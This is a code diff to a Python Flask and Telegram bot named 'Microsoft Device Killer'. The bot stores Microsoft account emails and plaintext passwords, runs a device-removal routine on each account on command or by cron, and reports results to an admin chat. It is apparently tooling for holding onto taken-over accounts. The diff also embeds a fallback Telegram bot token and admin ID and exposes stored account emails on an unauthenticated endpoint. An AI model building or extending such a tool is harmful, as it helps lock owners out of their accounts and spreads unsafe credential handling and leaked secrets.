@@ -1,12 +1,13 @@
 """
-MICROSOFT DEVICE KILLER - ALL IN ONE
-Deploy to Railway.com - One file, everything included
+MICROSOFT DEVICE KILLER - FIXED TELEGRAM VERSION
+Deploy to Railway.com - Auto-detects domain, sets webhook, sends startup message
 """
 
 import os
 import time
 import logging
 import sqlite3
+import requests
 from datetime import datetime
 from flask import Flask, request, jsonify
 from selenium import webdriver
@@ -18,8 +19,23 @@ TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8673909593:AAHfQzpUWGiJIqJG-p
 ADMIN_CHAT_ID = int(os.environ.get('ADMIN_CHAT_ID', '8260250818'))
 PORT = int(os.environ.get('PORT', 5000))
 
+# Get Railway domain (CRITICAL for webhook)
+RAILWAY_DOMAIN = os.environ.get('RAILWAY_PUBLIC_DOMAIN', '')
+if not RAILWAY_DOMAIN:
+    # Fallback: try to detect from environment
+    RAILWAY_DOMAIN = os.environ.get('RAILWAY_STATIC_URL', '')
+if not RAILWAY_DOMAIN:
+    RAILWAY_DOMAIN = os.environ.get('RAILWAY_URL', '')
+if not RAILWAY_DOMAIN:
+    RAILWAY_DOMAIN = 'localhost'
+
+# Remove https:// if present
+RAILWAY_DOMAIN = RAILWAY_DOMAIN.replace('https://', '').replace('http://', '')
+
+WEBHOOK_URL = f"https://{RAILWAY_DOMAIN}/{TELEGRAM_TOKEN}"
+
 # Database setup
-DB_PATH = '/tmp/accounts.db'  # Use /tmp for Railway
+DB_PATH = '/tmp/accounts.db'
 conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 cursor = conn.cursor()
 cursor.execute('''
@@ -49,6 +65,42 @@ conn.commit()
 # Flask app
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
+
+# ============ TELEGRAM FUNCTIONS ============
+def send_telegram(chat_id, text, parse_mode=None):
+    """Send message via Telegram API"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    try:
+        payload = {'chat_id': chat_id, 'text': text}
+        if parse_mode:
+            payload['parse_mode'] = parse_mode
+        r = requests.post(url, json=payload, timeout=10)
+        return r.json()
+    except Exception as e:
+        logging.error(f"Send error: {e}")
+        return None
+
+def set_webhook():
+    """Set Telegram webhook to current Railway URL"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook"
+    payload = {'url': WEBHOOK_URL}
+    try:
+        r = requests.post(url, json=payload, timeout=10)
+        result = r.json()
+        logging.info(f"Webhook set to {WEBHOOK_URL}: {result}")
+        return result
+    except Exception as e:
+        logging.error(f"Webhook error: {e}")
+        return None
+
+def get_webhook_info():
+    """Get current webhook status"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getWebhookInfo"
+    try:
+        r = requests.get(url, timeout=10)
+        return r.json()
+    except:
+        return None
 
 # ============ DEVICE KILLER FUNCTION ============
 def remove_devices(email, password):
@@ -120,17 +172,8 @@ def remove_devices(email, password):
         if driver:
             driver.quit()
 
-# ============ TELEGRAM FUNCTIONS ============
-def send_telegram(chat_id, text):
-    """Send message via Telegram"""
-    import requests
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    try:
-        requests.post(url, json={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=10)
-    except:
-        pass
-
-def handle_telegram_command(text, chat_id):
+# ============ COMMAND PROCESSING ============
+def process_command(text, chat_id):
     """Process Telegram commands"""
     if chat_id != ADMIN_CHAT_ID:
         send_telegram(chat_id, "⛔ Unauthorized")
@@ -141,18 +184,27 @@ def handle_telegram_command(text, chat_id):
     
     # /start or /help
     if cmd in ['/start', '/help']:
-        msg = """🔐 *MS DEVICE KILLER*
+        msg = """🔐 *MS DEVICE KILLER* - RUNNING
         
-Commands:
+✅ Bot is online!
+
+*Commands:*
 /add email pass - Add account
 /list - Show accounts
-/activate id - Enable
-/deactivate id - Disable
-/run id - Process one
+/activate id - Enable account
+/deactivate id - Disable account
+/run id - Process one account
 /runall - Process all active
-/remove id - Delete
-/stats - Show totals"""
-        send_telegram(chat_id, msg)
+/remove id - Delete account
+/stats - Show totals
+/debug - Show webhook status"""
+        send_telegram(chat_id, msg, parse_mode='Markdown')
+        return
+    
+    # /debug - show webhook info
+    if cmd == '/debug':
+        info = get_webhook_info()
+        send_telegram(chat_id, f"Webhook URL: {WEBHOOK_URL}\n\nResponse: {info}")
         return
     
     # /add email password
@@ -163,8 +215,8 @@ Commands:
             cursor.execute("INSERT INTO accounts (email, password) VALUES (?, ?)", (email, password))
             conn.commit()
             send_telegram(chat_id, f"✅ Added {email}")
-        except:
-            send_telegram(chat_id, f"❌ Already exists")
+        except Exception as e:
+            send_telegram(chat_id, f"❌ Error: {e}")
         return
     
     # /list
@@ -178,7 +230,7 @@ Commands:
         for r in rows:
             status = "🟢" if r[2] else "🔴"
             msg += f"{status} ID:{r[0]} {r[1]} | {r[4]} | {r[3]} removed\n"
-        send_telegram(chat_id, msg[:4000])
+        send_telegram(chat_id, msg[:4000], parse_mode='Markdown')
         return
     
     # /activate id
@@ -231,6 +283,7 @@ Commands:
             cursor.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
                            (datetime.now().isoformat(), result['removed'], 'Success' if result['success'] else 'Failed', row[0]))
             conn.commit()
+            send_telegram(chat_id, f"{row[1]}: {result['msg']}")
             time.sleep(2)
         send_telegram(chat_id, f"✅ Completed {len(rows)} accounts")
         return
@@ -254,27 +307,62 @@ Commands:
     
     send_telegram(chat_id, "Unknown command. Try /help")
 
-# ============ WEBHOOK ENDPOINT ============
+# ============ FLASK ENDPOINTS ============
 @app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
 def webhook():
     """Telegram webhook endpoint"""
-    data = request.get_json()
-    if data and 'message' in data:
-        chat_id = data['message']['chat']['id']
-        text = data['message'].get('text', '')
-        handle_telegram_command(text, chat_id)
+    try:
+        data = request.get_json()
+        if data and 'message' in data:
+            chat_id = data['message']['chat']['id']
+            text = data['message'].get('text', '')
+            process_command(text, chat_id)
+    except Exception as e:
+        logging.error(f"Webhook error: {e}")
     return 'ok'
 
 @app.route('/')
 def home():
-    return 'Microsoft Device Killer Bot Running'
+    return f"""
+    <h1>Microsoft Device Killer Bot</h1>
+    <p>Status: Running</p>
+    <p>Telegram Token: {TELEGRAM_TOKEN[:10]}...</p>
+    <p>Admin Chat ID: {ADMIN_CHAT_ID}</p>
+    <p>Railway Domain: {RAILWAY_DOMAIN}</p>
+    <p>Webhook URL: {WEBHOOK_URL}</p>
+    <p><a href="/webhook_status">Check Webhook Status</a></p>
+    <p><a href="/accounts">View Accounts</a></p>
+    """
+
+@app.route('/webhook_status')
+def webhook_status():
+    """Check Telegram webhook status"""
+    info = get_webhook_info()
+    return jsonify(info)
+
+@app.route('/accounts')
+def view_accounts():
+    """View all accounts in database"""
+    cursor.execute("SELECT * FROM accounts")
+    rows = cursor.fetchall()
+    return jsonify([{
+        'id': r[0],
+        'email': r[1],
+        'active': bool(r[3]),
+        'devices_removed': r[4],
+        'last_run': r[5],
+        'status': r[6]
+    } for r in rows])
+
+@app.route('/set_webhook', methods=['GET', 'POST'])
+def force_set_webhook():
+    """Manually set webhook"""
+    result = set_webhook()
+    return jsonify(result)
 
 @app.route('/cron', methods=['GET', 'POST'])
 def cron():
-    """Cron job endpoint - runs automatically every 5 minutes via Railway Cron"""
-    import requests
-    
-    # Get all active accounts
+    """Cron job endpoint - auto process active accounts"""
     cursor.execute("SELECT id, email, password FROM accounts WHERE active=1")
     rows = cursor.fetchall()
     
@@ -288,19 +376,26 @@ def cron():
                        (datetime.now().isoformat(), result['removed'], 'Success' if result['success'] else 'Failed', row[0]))
         conn.commit()
         
-        # Log to Telegram
         icon = "✅" if result['success'] else "❌"
-        send_telegram(ADMIN_CHAT_ID, f"{icon} {row[1]}\n{result['msg']}")
+        send_telegram(ADMIN_CHAT_ID, f"[AUTO] {icon} {row[1]}\n{result['msg']}")
         results.append(f"{row[1]}: {result['msg']}")
         time.sleep(2)
     
     return f'Processed {len(rows)} accounts\n' + '\n'.join(results)
 
-# ============ MAIN ============
+# ============ STARTUP ============
 if __name__ == '__main__':
-    # Set webhook
-    import requests
-    webhook_url = f"https://{os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost')}/{TELEGRAM_TOKEN}"
-    requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url={webhook_url}")
+    logging.info("Starting bot...")
+    logging.info(f"Railway Domain: {RAILWAY_DOMAIN}")
+    logging.info(f"Webhook URL: {WEBHOOK_URL}")
+    
+    # Set webhook on startup
+    webhook_result = set_webhook()
+    logging.info(f"Webhook result: {webhook_result}")
+    
+    # Send startup message to admin
+    if RAILWAY_DOMAIN != 'localhost':
+        time.sleep(2)
+        send_telegram(ADMIN_CHAT_ID, f"✅ Bot deployed and running!\n\nWebhook: {WEBHOOK_URL}\n\nSend /help for commands")
     
     app.run(host='0.0.0.0', port=PORT)
